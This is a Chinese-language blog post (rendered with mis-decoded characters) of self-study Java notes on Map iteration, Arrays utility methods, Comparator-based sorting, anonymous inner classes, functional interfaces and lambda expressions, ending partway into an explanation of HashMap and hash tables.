<link>https://juejin.cn/post/7594389937462853642</link>    <guid>https://juejin.cn/post/7594389937462853642</guid>    <pubDate>2026-01-13T02:20:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937462853642" data-draft-id="7593603345517953051" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è‡ªå­¦Javaæ‰‹è®°ï¼šMapé›†åˆï¼ŒArrayså·¥å…·ç±»å’ŒLambdaè¡¨è¾¾å¼"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-13T02:20:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—é¹¿ä¸éº‹é¹¿"/> <meta itemprop="url" content="https://juejin.cn/user/1171417458284602"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è‡ªå­¦Javaæ‰‹è®°ï¼šMapé›†åˆï¼ŒArrayså·¥å…·ç±»å’ŒLambdaè¡¨è¾¾å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1171417458284602/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—é¹¿ä¸éº‹é¹¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:20:39.000Z" title="Tue Jan 13 2026 02:20:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">Mapå¸¸è§APIå’Œå°tips</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7afc1388e6f6498da11736bb369f3d0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX6bm_5LiN6bqL6bm_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875639&amp;x-signature=0ZeZDtWMuK8WnDEek5RP1JwAZQQ%3D" alt="5461bd27-244a-412b-87e9-9466b7bb7559.png" loading="lazy"/>
tipsï¼šputæ–¹æ³•çš„ç»†èŠ‚ï¼Œåœ¨æ·»åŠ æ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœé”®ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆç›´æ¥æŠŠé”®å€¼å¯¹å¯¹è±¡æ·»åŠ åˆ°mapé›†åˆå½“ä¸­,æ–¹æ³•è¿”å›nullï¼›å¦‚æœé”®æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆä¼šæŠŠåŸæœ‰çš„é”®å€¼å¯¹å¯¹è±¡è¦†ç›–ï¼Œä¼šæŠŠè¢«è¦†ç›–çš„å€¼è¿›è¡Œè¿”å›ã€‚</p>
<pre><code class="hljs language-å¯¹è±¡çš„åˆ›å»º" lang="å¯¹è±¡çš„åˆ›å»º">Map&lt;String,String&gt; map=new HashMap&lt;&gt;();
</code></pre>
<h4 data-id="heading-1">Mapçš„éå†æ–¹å¼</h4>
<p>&lt;1&gt;</p>
<pre><code class="hljs language-å¢å¼ºfor" lang="å¢å¼ºfor">Set&lt;String&gt; keys=map.keySet();//è·å–æ‰€æœ‰çš„é”®ï¼ŒæŠŠè¿™äº›é”®æ”¾åˆ°ä¸€ä¸ªå•åˆ—é›†åˆä¸­
for (String key:keys){
    System.out.println(map.get(key));
    //åˆ©ç”¨mapé›†åˆä¸­çš„é”®è·å–å¯¹åº”çš„å€¼
    String value=map.get(key);
    System.out.println(value);
}
</code></pre>
<p>&lt;2&gt;</p>
<pre><code class="hljs language-é€šè¿‡é”®å€¼å¯¹å¯¹è±¡è¿›è¡Œéå†" lang="é€šè¿‡é”®å€¼å¯¹å¯¹è±¡è¿›è¡Œéå†">Set&lt;Map.Entry&lt;String,String&gt;&gt; entries=map.entrySet();
//é€šè¿‡ä¸€ä¸ªæ–¹æ³•è·å–æ‰€æœ‰çš„é”®å€¼å¯¹å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªseté›†åˆ
for(Map.Entry&lt;String,String&gt; entry:entries){
    String key=entry.getKey();
    String value=entry.getValue();
    System.out.println(key+":"+value);
}
</code></pre>
<h4 data-id="heading-2">å‰æï¼šå€ŸArrayså·¥å…·ç±»åˆæ­¥å­¦ä¹ Lambdaè¡¨è¾¾å¼</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f4cfe8f6f344094b6ee70d7e87efa71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX6bm_5LiN6bqL6bm_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875639&amp;x-signature=NLPf7j4fL8Cwhs5HuqqccDP%2BVO8%3D" alt="image.png" loading="lazy"/>
tipsï¼šbinarySearchï¼ˆäºŒåˆ†æŸ¥æ‰¾æ³•æŸ¥æ‰¾å…ƒç´ ï¼‰ï¼Œæ•°ç»„ä¸­çš„å…ƒç´ å¿…é¡»æ˜¯æœ‰åºçš„ã€å‡åºçš„ï¼Œå¦‚æœè¦æŸ¥æ‰¾çš„å…ƒç´ æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆè¿”å›çš„æ˜¯çœŸå®ç´¢å¼•ï¼›å¦‚æœæŸ¥æ‰¾çš„å…ƒç´ æ˜¯ä¸å­˜åœ¨çš„ï¼Œè¿”å›çš„æ˜¯åº”è¯¥æ’å…¥ç‚¹ï¼ˆæŒ‡è¯¥å…ƒç´ åœ¨æ’å…¥åæ•°ç»„ä»èƒ½ä¿æŒå‡åºçš„ä½ç½®ï¼‰çš„è´Ÿå€¼-1ã€‚copyOfRangeï¼ˆæŒ‡å®šèŒƒå›´æ‹·è´æ•°ç»„ï¼‰ï¼ŒåŒ…å¤´ä¸åŒ…å°¾ï¼ŒåŒ…å·¦ä¸åŒ…å³ã€‚sortï¼Œ</p>
<pre><code class="hljs language-sortå‡åºæ’åˆ—çš„åŸç†å’Œé™åºæ’åˆ—çš„å®ç°" lang="sortå‡åºæ’åˆ—çš„åŸç†å’Œé™åºæ’åˆ—çš„å®ç°">Integer[] arr={4,3,5,6,8,11,9};
//ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦ä¼ é€’è¿™ä¸ªæ¥å£çš„å®ç°ç±»å¯¹è±¡ï¼Œä½œä¸ºæ’åºçš„è§„åˆ™ã€‚
//åœ¨è¿™é‡Œï¼Œè¿™ä¸ªå®ç°ç±»æˆ‘ä»¬åªè¦ä½¿ç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å¿…è¦å•ç‹¬çš„å»å†™ä¸€ä¸ªç±»ï¼Œç›´æ¥é‡‡å–åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼ã€‚
//åŸç†ï¼šæ’å…¥æ’åº+äºŒåˆ†æŸ¥æ‰¾çš„æ–¹å¼è¿›è¡Œæ’åºã€‚
//é»˜è®¤æŠŠ0ç´¢å¼•çš„æ•°æ®å½“ä½œæœ‰åºçš„åºåˆ—ï¼Œ1ç´¢å¼•åˆ°æœ€åè®¤ä¸ºæ˜¯æ— åºåºåˆ—ã€‚
//éå†æ— åºåºåˆ—å¾—åˆ°é‡Œé¢æ¯ä¸€ä¸ªå…ƒç´ ï¼Œå‡è®¾å½“å‰éå†åˆ°çš„å…ƒç´ æ˜¯Aå…ƒç´ ã€‚
//æŠŠAå¾€æœ‰åºåºåˆ—ä¸­è¿›è¡Œæ’å…¥ï¼Œåœ¨æ’å…¥çš„æ—¶å€™ï¼Œåˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾ç¡®å®šAå…ƒç´ çš„æ’å…¥ç‚¹ã€‚
//æ‹¿ç€Aå…ƒç´ å’Œæ’å…¥ç‚¹çš„å…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œæ¯”è¾ƒçš„è§„åˆ™æ˜¯compareæ–¹æ³•çš„æ–¹æ³•ä½“ã€‚
//å¦‚æœæ–¹æ³•çš„è¿”å›å€¼æ˜¯è´Ÿæ•°ï¼Œæ‹¿ç€Aå’Œå‰é¢çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒã€‚
//å¦‚æœæ–¹æ³•çš„è¿”å›å€¼æ˜¯æ­£æ•°æˆ–0ï¼Œæ‹¿ç€Aå’Œåé¢çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒã€‚
//ç›´åˆ°èƒ½ç¡®å®šAçš„æœ€ç»ˆä½ç½®ã€‚

//compareæ–¹æ³•çš„å½¢å‚ï¼šå‚æ•°ä¸€o1,è¡¨ç¤ºåœ¨æ— åºåºåˆ—ä¸­ï¼Œéå†å¾—åˆ°çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼›å‚æ•°äºŒo2ï¼Œæœ‰åºåºåˆ—ä¸­çš„å…ƒç´ 

//è¿”å›å€¼ï¼šè´Ÿæ•°ï¼Œè¡¨ç¤ºå½“å‰è¦æ’å…¥çš„å…ƒç´ æ˜¯å°çš„ï¼Œæ”¾åœ¨å‰é¢ï¼›æ­£æ•°ï¼Œå’Œè´Ÿæ•°ç›¸åï¼›0ï¼Œè¡¨ç¤ºå½“å‰è¦æ’å…¥çš„å…ƒç´ å’Œç°åœ¨çš„å…ƒç´ æ¯”æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿè¦æ”¾åœ¨åé¢

//ç®€å•ç†è§£ï¼šo1-o2,å‡åºæ’åˆ—ï¼›o2-o1ï¼Œé™åºæ’åˆ—
Arrays.sort(arr,new Comparator&lt;Integer&gt;() {
    @Override
    public int compare(Integer o1, Integer o2) {
        return o1-o2;
    }
});
</code></pre>
<h4 data-id="heading-3">çŸ¥è¯†è¡ç”Ÿ</h4>
<h5 data-id="heading-4">1.åŒ¿åå†…éƒ¨ç±»ï¼šå°±æ˜¯ä¸€ä¸ªâ€œæ²¡æœ‰åå­—â€çš„ç±»ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶ç›´æ¥å®šä¹‰ã€‚ï¼ˆ</h5>
<ul>
<li>æ­£å¸¸ç±»ï¼š<code>class MyComparator implements Comparator&lt;Integer&gt;</code>ç„¶åèµ·å <code>MyComparator</code></li>
<li>åŒ¿åç±»ï¼šç›´æ¥<code>new Comparator&lt;Integer&gt;() { ... }</code>ï¼Œ<strong>æ²¡æœ‰ç±»å</strong>ï¼‰</li>
</ul>
<p>åŒ¿åå†…éƒ¨ç±»å°±æ˜¯â€œä¸´æ—¶å·¥â€ï¼Œç”¨å®Œå°±æ‰”ï¼Œä¸“é—¨è§£å†³è¿™ç§ä¸€æ¬¡æ€§çš„å®ç°éœ€æ±‚ã€‚</p>
<h5 data-id="heading-5">2.æ€ä¹ˆçŸ¥é“å“ªä¸ªæ¥å£åªæœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Ÿ</h5>
<h6 data-id="heading-6">æ–¹æ³•1ï¼šçœ‹æ–‡æ¡£/æºç æ³¨è§£ï¼š</h6>
<pre><code class="hljs language-csharp" lang="csharp">@FunctionalInterface  <span class="hljs-comment">// â† æœ‰è¿™ä¸ªæ³¨è§£å°±æ˜¯å‡½æ•°å¼æ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">T</span>&gt; {
    <span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">compare</span>(<span class="hljs-params">T o1, T o2</span>)</span>;
    <span class="hljs-comment">// å¯ä»¥æœ‰å¤šä¸ªé»˜è®¤æ–¹æ³•ã€é™æ€æ–¹æ³•ï¼Œä½†åªèƒ½æœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•</span>
}
</code></pre>
<h6 data-id="heading-7">å¸¸è§å‡½æ•°å¼æ¥å£ï¼ˆå‡½æ•°å¼æ¥å£ï¼ˆæˆ–ç§°ä¸ºåªæœ‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•çš„æ¥å£ï¼‰å¿…é¡»æä¾›å…·ä½“å®ç°ï¼ˆé‡å†™ï¼‰æ‰èƒ½ä½¿ç”¨ï¼‰ï¼š</h6>
<ul>
<li><code>Comparator&lt;T&gt;</code>- æ¯”è¾ƒå™¨</li>
<li><code>Runnable</code>- çº¿ç¨‹ä»»åŠ¡ï¼ˆåªæœ‰ä¸€ä¸ª<code>run()</code>æ–¹æ³•ï¼‰</li>
<li><code>Callable&lt;V&gt;</code>- å¸¦è¿”å›å€¼çš„ä»»åŠ¡</li>
<li><code>Consumer&lt;T&gt;</code>- æ¶ˆè´¹è€…ï¼ˆæ¥æ”¶å‚æ•°æ— è¿”å›å€¼ï¼‰</li>
<li><code>Supplier&lt;T&gt;</code>- ä¾›åº”å•†ï¼ˆæ— å‚æ•°æœ‰è¿”å›å€¼ï¼‰</li>
<li><code>Function&lt;T,R&gt;</code>- å‡½æ•°ï¼ˆæ¥æ”¶Tè¿”å›Rï¼‰</li>
<li><code>Predicate&lt;T&gt;</code>- æ–­è¨€ï¼ˆåˆ¤æ–­æ¡ä»¶ï¼‰</li>
</ul>
<h6 data-id="heading-8">æ–¹æ³•2ï¼šçœ‹æŠ½è±¡æ–¹æ³•æ•°é‡ï¼š</h6>
<ul>
<li>åªæœ‰ä¸€ä¸ª<strong>æŠ½è±¡æ–¹æ³•</strong>ï¼ˆä¸åŒ…æ‹¬<code>default</code>é»˜è®¤æ–¹æ³•å’Œ<code>static</code>é™æ€æ–¹æ³•ï¼‰</li>
<li>æ¯”å¦‚<code>Comparator</code>ï¼šåªæœ‰<code>compare</code>æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå…¶ä»–å¦‚<code>reversed()</code>æ˜¯é»˜è®¤æ–¹æ³•</li>
</ul>
<h6 data-id="heading-9">æ–¹æ³•3ï¼šç”¨Lambdaè¡¨è¾¾å¼éªŒè¯ï¼Œèƒ½ç”¨Lambdaè¡¨è¾¾å¼ç®€å†™çš„æ¥å£å°±æ˜¯å‡½æ•°å¼æ¥å£ï¼š</h6>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åŒ¿åå†…éƒ¨ç±»</span>
Arrays.sort(arr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Integer&gt;() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> {
        <span class="hljs-keyword">return</span> o1 - o2;
    }
});
<span class="hljs-comment">// Lambdaç®€å†™ï¼ˆè¯æ˜Comparatoræ˜¯å‡½æ•°å¼æ¥å£ï¼‰</span>
Arrays.sort(arr, (o1, o2) -&gt; o1 - o2);
</code></pre>
<h5 data-id="heading-10">3.æ¥å£çš„å®ç°ç±»å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿ</h5>
<p>æ¥å£å°±åƒâ€œæ ‡å‡†/åˆåŒâ€ï¼ŒComparatorè¿™ä¸ªæ¥å£è§„å®šï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">    <span class="hljs-keyword">interface</span> Comparator&lt;<span class="hljs-type">Integer</span>&gt; {
    int <span class="hljs-keyword">compare</span>(<span class="hljs-type">Integer</span> o1, <span class="hljs-type">Integer</span> o2);
}
</code></pre>
<p>ä»»ä½•æƒ³å½“æˆ‘â€œå®ç°ç±»â€çš„ï¼Œï¼ˆåœ¨è¿™ä¸ªæƒ…å¢ƒä¸‹ï¼‰å¿…é¡»æœ‰ä¸€ä¸ªcompareæ–¹æ³•ï¼Œèƒ½æ¯”è¾ƒä¸¤ä¸ªæ•°è°å¤§è°å°ï¼Œå¹¶è¿”å›æ•´æ•°ã€‚ä½†æ¥å£è‡ªå·±æ˜¯ä¸ªç©ºå£³ï¼Œæ²¡æœ‰å…·ä½“æ¯”è¾ƒé€»è¾‘ï¼ˆä¸çŸ¥é“æ˜¯å‡åºè¿˜æ˜¯é™åºï¼‰ã€‚</p>
<p>â€œå®ç°ç±»å¯¹è±¡â€å°±æ˜¯â€œæŒ‰åˆåŒå¹²æ´»çš„å…·ä½“å·¥äººâ€ã€‚ä½ è¦ç”¨Arrays.sortæ’åºï¼ŒJavaé—®ï¼š â€œä½ æƒ³æŒ‰ä»€ä¹ˆè§„åˆ™æ’åºï¼Ÿâ€ ä½ ä¸èƒ½åªè¯´â€œæŒ‰Comparatorè§„åˆ™â€ï¼Œä½ è¦çœŸçš„ç»™ä¸€ä¸ªèƒ½å¹²æ´»çš„å…·ä½“å¯¹è±¡ã€‚</p>
<p>new Comparator() { ... }â†’ å½“åœºé€ ä¸€ä¸ªâ€œä¸´æ—¶å·¥äººâ€ï¼Œè¿™ä¸ªä¸´æ—¶å·¥äººå®ç°äº†Comparatoræ¥å£ï¼ˆå› ä¸ºæœ‰compareæ–¹æ³•ï¼‰ï¼Œè¿™ä¸ªâ€œä¸´æ—¶å·¥äººå¯¹è±¡â€ç›´æ¥è¢«ä¼ ç»™sortæ–¹æ³•ä½¿ç”¨ï¼Œç”¨å®Œåè¿™ä¸ªâ€œä¸´æ—¶å·¥äººâ€å°±è¢«ä¸¢å¼ƒï¼ˆå› ä¸ºåªéœ€è¦è¿™ä¸€æ¬¡ï¼‰ã€‚</p>
<h4 data-id="heading-11">Lambdaè¡¨è¾¾å¼ï¼ˆç®€åŒ–åŒ¿åå†…éƒ¨ç±»çš„ä¹¦å†™ï¼‰</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c9b5ed5691747a28eb2b4042966501f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX6bm_5LiN6bqL6bm_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875639&amp;x-signature=QXMWNzp4i8kJpRf1s0QbvrGZViw%3D" alt="image.png" loading="lazy"/>
å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³ï¼Œå¿½ç•¥é¢å‘å¯¹è±¡çš„å¤æ‚è¯­æ³•ï¼Œå¼ºè°ƒåšä»€ä¹ˆï¼Œè€Œä¸æ˜¯è°å»åš</p>
<h6 data-id="heading-12">æ ¼å¼</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d1965f4977541de884a975c7fb5ecd5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX6bm_5LiN6bqL6bm_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875639&amp;x-signature=qIJHpHeGJbZzWBrGqTcVMU8qHhw%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7eeaa580d3d4253a2e2fe60d9bc70ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX6bm_5LiN6bqL6bm_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875639&amp;x-signature=SUN7ZJVpniXHnyUwBSTDehw5Ync%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">methodDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">//è°ƒç”¨ä¸€ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œå¦‚æœæ–¹æ³•çš„å½¢å‚æ˜¯ä¸€ä¸ªæ¥å£ï¼Œé‚£æˆ‘ä»¬è¦ä¼ é€’è¿™ä¸ªæ¥å£çš„å®ç°ç±»å¯¹è±¡</span>
        <span class="hljs-comment">//å¦‚æœå®ç°ç±»å¯¹è±¡åªè¦ç”¨åˆ°ä¸€æ¬¡ï¼Œå°±å¯ä»¥ç”¨åŒ¿åå†…éƒ¨ç±»çš„å½¢å¼è¿›è¡Œä¹¦å†™</span>
        <span class="hljs-title function_">method</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">swim</span>(<span class="hljs-params"/>) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">swimming</span>(<span class="hljs-params"/>) {
                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ­£åœ¨æ¸¸æ³³~~~"</span>);
            }
        });
        <span class="hljs-comment">//åˆ©ç”¨lambdaè¡¨è¾¾å¼è¿›è¡Œæ”¹å†™</span>
        <span class="hljs-title function_">method</span>(
                ()-&gt;{
                    <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ­£åœ¨æ¸¸æ³³~~~"</span>);
                }
        );
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">method</span>(<span class="hljs-params">swim s</span>){
        s.<span class="hljs-title function_">swimming</span>();
    }
    <span class="hljs-keyword">interface</span> swim{
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">swimming</span>();
    }
}
</code></pre>
<p>&lt;3&gt;</p>
<pre><code class="hljs language-Lambdaè¡¨è¾¾å¼" lang="Lambdaè¡¨è¾¾å¼">Map&lt;String,String&gt; map=new HashMap&lt;&gt;();
//forEachå…¶å®å°±æ˜¯åˆ©ç”¨ç¬¬äºŒç§æ–¹å¼è¿›è¡Œéå†ï¼Œä¾æ¬¡å¾—åˆ°æ¯ä¸€ä¸ªé”®å’Œå€¼
//å†è°ƒç”¨acceptæ–¹æ³•
map.forEach(new BiConsumer&lt;String, String&gt;() {
    @Override
    public void accept(String key, String value) {
        System.out.println(key+":"+value);
    }
});
map.forEach((key,value)-&gt;{
    System.out.println(key+":"+value);
});
</code></pre>
<h4 data-id="heading-13">HashMapçš„ç‰¹ç‚¹</h4>
<ul>
<li>HashMapæ˜¯Mapé‡Œçš„ä¸€ä¸ªå®ç°ç±»</li>
<li>æ²¡æœ‰é¢å¤–éœ€è¦å­¦ä¹ çš„ç‰¹æœ‰æ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨Mapé‡Œé¢çš„æ–¹æ³•å°±è¡Œäº†</li>
<li>æ— åºã€ä¸é‡å¤ã€æ— ç´¢å¼•</li>
<li>HashMapå’ŒHashSetåº•å±‚åŸç†æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å“ˆå¸Œè¡¨ç»“æ„ï¼ˆå“ˆå¸Œè¡¨æ˜¯ä¸€ç§é«˜æ•ˆçš„ <strong>â€œé”®-å€¼â€å­˜å‚¨ç»“æ„</strong>ã€‚ï¼‰ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ª<strong>æ™ºèƒ½æŠ½å±‰æŸœ</strong>ï¼š</li>
</ul>
<hr/>
<h5 data-id="heading-14"><strong>æ ¸å¿ƒåŸç†</strong>ï¼ˆç°å®æ¯”å–»ï¼‰ï¼š</h5>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªæŠ½å±‰æŸœï¼ˆå“ˆå¸Œè¡¨ï¼‰ï¼Œæ¯ä»¶ç‰©å“ï¼ˆå€¼ï¼‰éƒ½æœ‰ä¸€ä¸ª<strong>å”¯ä¸€æ ‡ç­¾ï¼ˆé”®ï¼‰</strong> ã€‚</p>
